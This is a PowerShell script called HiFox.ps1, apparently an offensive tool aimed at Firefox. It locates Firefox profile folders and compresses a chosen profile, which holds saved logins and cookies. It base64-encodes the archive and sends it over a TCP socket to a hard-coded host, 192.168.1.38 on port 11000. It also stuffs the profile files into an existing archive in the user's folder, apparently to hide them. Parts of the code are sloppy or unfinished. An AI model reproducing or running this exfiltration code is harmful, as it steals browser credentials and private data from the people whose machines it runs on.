
<#

    HiFox.ps1
    Author: J. Moreno @j0moz4 
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

$profilespath=$env:APPDATA+"\Mozilla\Firefox\Profiles"
$profilesInipath=$env:APPDATA+"\Mozilla\Firefox\profiles.ini"
$myArray = @{}
$i = 0 

#-------------------------------------------------------------------
#BANNER
#-------------------------------------------------------------------
Write-Host "" -ForegroundColor Yellow
Write-Host "  _,-=._            /|_/|   Hi!Fox" -ForegroundColor Yellow
Write-Host " `-.}   `=._,.-=-._.,  @ @._," -ForegroundColor Yellow
Write-Host "     `._ _,-.   )      _,.-'" -ForegroundColor Yellow
Write-Host "        `    G.m-^m`m'" -ForegroundColor Yellow
Write-Host "______________________________________" -ForegroundColor Yellow
Write-Host "" -ForegroundColor Yellow

#-------------------------------------------------------------------
#Check winRAR installed
#-------------------------------------------------------------------

if(Test-Path "C:\Program Files\Winrar"){
      Write-Host "WinRAR detected on system!" -ForegroundColor Green
      $winrarPath = "C:\Program Files\Winrar\WinRAR.exe"
      $wrar = 1 

}else{
      Write-Host "WinRAR not detected on system, will use only .zip files" -ForegroundColor Red
      $wrar = 0
}

#-------------------------------------------------------------------
#Zip/RAR Finding
#-------------------------------------------------------------------

if($wrar){

      $zipFilesInDownloadPath = Get-ChildItem -Path $env:USERPROFILE -Include *.zip,*.rar,*.tar.gz -r | Sort-Object Length

      if ($zipFilesInDownloadPath.Length -eq "0") {
            $fileOpt = Read-Host -Prompt "No zip found on user path.
            `nDo a massive search? Use a Random path? (F/R)`n"
      }else{
            $zipFilesInDownloadPath[0].FullName
            $fileOpt = Read-Host -Prompt "This is the smallest compressed file in the user folder.
            `nDo you want to use it? 
            `nDo a massive search? 
            `nUse a Random path? (Y/F/R)`n"
      }

      if ($fileOpt -eq "Y") {
            $zipObj = $zipFilesInDownloadPath[0].FullName
      }elseif($fileOpt -eq "F"){
            #FullFileSearch
            $zipObj = $zipFilesInDownloadPath[0].FullName
      }elseif($fileOpt -eq "R"){
            #RandomFileSearch
            $fileRnd = Read-Host -Prompt "Enter path to search some zip file"
            $zipObj = $zipFilesInDownloadPath[0].FullName
      }

}else{

      $zipFilesInDownloadPath = Get-ChildItem -Path $env:USERPROFILE -Include *.zip,*.tar.gz -r | Sort-Object Length

      if ($zipFilesInDownloadPath.Length -eq "0") {
            $fileOpt = Read-Host -Prompt "No zip found on user path.`nDo a massive search?`nUse a Random path?`n(F/R)`n"
      }else{
            $zipFilesInDownloadPath[0].FullName
            $fileOpt = Read-Host -Prompt "This is the smallest compressed file in the user folder. 
            `nDo you want to use it? 
            `nDo a massive search? 
            `nUse a Random path? 
            (Y/F/R)`n"
      }

      if ($fileOpt -eq "Y") {
            $zipObj = $zipFilesInDownloadPath[0].FullName
      }elseif($fileOpt -eq "F"){
            #FullFileSearch
            $zipFilesInDownloadPath = Get-ChildItem -Path "C:\" -Include *.zip,*.tar.gz -r | Sort-Object Length
            $zipObj = $zipFilesInDownloadPath[0].FullName
      }elseif($fileOpt -eq "R"){
            #RandomFileSearch
            $fileRnd = Read-Host -Prompt "Enter path to search some zip file"
            $zipFilesInDownloadPath = Get-ChildItem -Path $fileRnd -Include *.zip,*.tar.gz -r | Sort-Object Length
            $zipObj = $zipFilesInDownloadPath[0].FullName
      }

}
<#
$rnd = Get-Random
$zipDest = $env:TMP+"\"+$rnd+".zip"
Compress-Archive -Path $_.FullName -CompressionLevel Fastest -DestinationPath $zipDest
#>

#Interact with selected zipped
$file1 = "C:\Users\jomoza\Desktop\"

#([IO.FileInfo]$zipObj).Extension 
#-------------------------------------------------------------------
#Selecting profile Ini
#ParseProfileIni
#-------------------------------------------------------------------

if ([System.IO.File]::Exists($profilesInipath)) {
      Write-Host "Default profile init exist : "$profilesInipath
      $opIni = Read-Host -Prompt 'Use it? (Y/N)'
      if ($opIni -eq "N")                 
      {
            $profilesInipath = Read-Host -Prompt 'Enter profile.ini file (full path):'
      }
      Get-Content $profilesInipath | ForEach-Object {
            if ($_.StartsWith('Path=')) {
                  $name, $value = $_ -split "=", 2
                  if (!$value.StartsWith("Profiles")) {     
                        #Write-Host $value
                        $profPa = $value+"\"
                        $myArray.Add("$i","$profPa")
                        $i++
                  }
            }
      }

}
$items = Get-ChildItem -Path $profilespath
foreach ($item in $items){
      $i++
      $myArray.Add("$i","$profilespath\$item\")
}

#-------------------------------------------------------------------#


#-------------------------------------------------------------------#

Write-Host "`n[+] Selecting profile path:"
Write-Host "[+] default profiles paths."
$myArray.Keys | ForEach-Object {
      Write-Host "[+] : $_ : "$myArray.$_
}
Write-Host "[+] : X : Enter custom profile path." 
Write-Host "`n"$myArray.Count"Profiles Found, select one.`n"

$ProfPathNum = Read-Host -Prompt 'Enter option:'

if ($ProfPathNum -eq "X") {
      $ProfTo = Read-Host -Prompt 'Enter path (full) of profile target :'
}else { 
      $ProfTo = $myArray[$ProfPathNum].ToString()  
}

Write-Host "You select " $ProfTo
<#
Write-Host "Profile content :`n"
$files = get-childitem $ProfTo -Name
foreach ($file in $files)
{
      Write-Host $file
      if ($file -eq "logins.json") {
            $loginPath = $myArray[$ProfPathNum]+""+$file
            Write-Host $loginPath      
      }
}

<#
Compresing ff profile using Compres-Archive and WinRAR bin. 
#>
$winrar = "C:\Program Files\WinRAR\WinRAR.exe"
#$profilespath=$env:APPDATA+"\Mozilla\Firefox\Profiles\"
$profilespath="C:\Users\jomoza\AppData\Roaming\Mozilla\Firefox\Profiles\c3knmtm6.Default Firefox JoMoZa-1562781524304"
$rnd = Get-Random
$zipDest = $env:TMP+"\"+$rnd+".zip"
$socket = New-Object net.sockets.tcpclient("192.168.1.38",11000);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);

Write-Output $profilespath

Compress-Archive -Update -Path $profilespath -CompressionLevel Fastest -DestinationPath $zipDest
$ZipFileLocation = [System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipDest));
Write-Output $zipDest
$writer.WriteLine($ZipFileLocation);
$socket.close()

if(([IO.FileInfo]$zipObj).Extension -eq ".rar"){
      Get-ChildItem $ProfTo | ForEach-Object {
            Write-Host $_.FullName
            &$winrar e -ep1 -idq -r -y $_.FullName $zipObj
            $ZipFileLocation =[System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipObj));

            #$writer.WriteLine($ZipFileLocation);
      }       
}else{
      Get-ChildItem $ProfTo | ForEach-Object {
            Write-Host $_.FullName
            Compress-Archive -Path $_.FullName -Update -DestinationPath $zipObj
            $ZipFileLocation =[System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipObj));
            
      }              
}
echo $ZipFileLocation
$writer.WriteLine($ZipFileLocation);
$socket.close()
